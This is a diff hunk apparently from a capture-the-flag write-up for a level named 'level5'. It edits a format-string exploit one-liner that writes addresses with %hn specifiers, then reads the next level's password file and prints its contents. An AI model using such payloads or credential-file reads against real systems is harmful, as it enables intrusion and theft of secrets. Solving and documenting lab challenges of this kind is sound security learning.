@@ -168,7 +168,7 @@ Lower bytes (0x84a4):
 
 
 ```
-$ (python -c 'print("\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044s%4$hn" + "%31904s%5$hn")'; cat) | ./level5
+$ (python -c 'print("\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044d%4$hn" + "%31904d%5$hn")'; cat) | ./level5
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
